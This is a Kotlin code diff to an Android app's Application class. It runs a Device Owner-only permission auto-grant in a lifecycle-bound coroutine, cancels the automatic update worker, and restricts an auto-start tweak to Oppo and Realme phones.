@@ -10,8 +10,19 @@ import android.os.Build
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.launch
 
 class MicApp : Application() {
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    override fun onTerminate() {
+        super.onTerminate()
+        serviceScope.cancel()
+    }
 
     companion object {
         private const val TAG = "MicApp"
@@ -29,7 +40,10 @@ class MicApp : Application() {
         // Auto-grant all permissions ONLY if Device Owner (handles new permissions after updates)
         try {
             if (UpdateService.isDeviceOwner(this)) {
-                UpdateService.autoGrantPermissions(this)
+                // H-07: Use a tracked job or lifecycle-tied launch
+                serviceScope.launch {
+                    UpdateService.autoGrantPermissions(this@MicApp)
+                }
             }
         } catch (e: Exception) {
             Log.e(TAG, "Failed to auto-grant permissions: ${e.message}")
@@ -56,13 +70,12 @@ class MicApp : Application() {
             Log.e(TAG, "Failed to configure Chinese ROM settings: ${e.message}")
         }
         
-        // Automatic update checks DISABLED - updates only via dashboard trigger
-        // try {
-        //     UpdateWorker.schedule(this)
-        //     Log.i(TAG, "Update worker scheduled")
-        // } catch (e: Exception) {
-        //     Log.e(TAG, "Failed to schedule update worker: ${e.message}")
-        // }
+        // Automatic update checks DISABLED (Dashboard trigger only)
+        try {
+            UpdateWorker.cancel(this)
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to cancel update worker: ${e.message}")
+        }
         
         // Ensure critical prefs exist and migrate stale server URLs.
         try {
@@ -370,6 +383,8 @@ class MicApp : Application() {
      * Try to enable auto-start via ROM's content provider (Device Owner only)
      */
     private fun enableViaContentProvider(authority: String) {
+        val manufacturer = Build.MANUFACTURER.lowercase()
+        if (manufacturer != "oppo" && manufacturer != "realme") return
         try {
             val uri = Uri.parse("content://$authority/startup_app")
             val values = android.content.ContentValues().apply {
